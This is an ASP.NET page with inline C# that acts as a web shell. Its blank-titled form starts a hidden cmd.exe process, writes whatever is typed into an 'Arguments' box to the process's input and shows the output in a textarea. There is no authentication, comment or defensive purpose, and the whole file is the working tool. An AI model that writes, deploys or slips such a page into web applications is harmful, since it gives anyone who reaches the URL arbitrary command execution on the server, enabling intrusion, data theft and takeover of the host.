<%@ Page Language="C#" AutoEventWireup="true" EnableViewState="false" %>

<%@ Import Namespace="System.Diagnostics" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            Is Active:<%= _CmdProc!=null && !_CmdProc.HasExited  %><br />
            <asp:Button ID="btnExec" runat="server" Text="Run" OnClick="btnExec_Click" />
            &nbsp;&nbsp;&nbsp;
            <asp:Button ID="btnStop" runat="server" Text="Stop" OnClick="btnStop_Click" /><br />
            Command:<asp:TextBox ID="cmdLine" runat="server" Rows="2" Columns="80" TextMode="MultiLine"></asp:TextBox><br />
            Arguments:<asp:TextBox ID="args" runat="server" Rows="8" Columns="80" TextMode="MultiLine"></asp:TextBox>
            <asp:Button ID="btnCmd" runat="server" Text="Run Command" OnClick="btnCmd_Click" />
            &nbsp;&nbsp;&nbsp;
            <asp:Button ID="btnRefresh" runat="server" Text="Refresh" />
            &nbsp;&nbsp;&nbsp;
            <asp:Button ID="btnClear" runat="server" Text="Clear" OnClick="btnClear_Click" />
            <br />
        </div>
    </form>
    <textarea rows="25" cols="80"><%= _buf.ToString() %></textarea>
</body>
</html>
<script runat="server">

    static Process _CmdProc;
    static StringBuilder _buf = new StringBuilder();

    protected override void OnInit(EventArgs e)
    {
        base.OnInit(e);
    }

    protected void btnExec_Click(object sender, EventArgs e)
    {
        if (_CmdProc != null && !_CmdProc.HasExited)
        {
            _CmdProc.Kill();
        }

        _CmdProc = new Process();
        _CmdProc.StartInfo.FileName = "cmd.exe";
        _CmdProc.StartInfo.UseShellExecute = false;
        _CmdProc.StartInfo.CreateNoWindow = true;
        _CmdProc.StartInfo.RedirectStandardInput = true;
        _CmdProc.StartInfo.RedirectStandardOutput = true;
        _CmdProc.Start();

        System.Threading.ThreadPool.QueueUserWorkItem(info => 
        {
            var proc = _CmdProc;
            while (proc != null && !proc.HasExited)
            {
                while (!proc.StandardOutput.EndOfStream)
                {
                    _buf.Append((char)proc.StandardOutput.Read());
                }
            }
        });

        if (!String.IsNullOrEmpty(cmdLine.Text))
        {

        }
    }

    protected void btnStop_Click(object sender, EventArgs e)
    {
        if (_CmdProc != null && !_CmdProc.HasExited)
        {
            _CmdProc.Kill();
        }

        _CmdProc = null;

    }

    protected void btnCmd_Click(object sender, EventArgs e)
    {
        if (_CmdProc != null && !_CmdProc.HasExited)
        {
            if (!String.IsNullOrEmpty(args.Text))
                _CmdProc.StandardInput.WriteLine(args.Text);
        }
    }


    protected void btnClear_Click(object sender, EventArgs e)
    {
        _buf.Clear();
    }
</script>
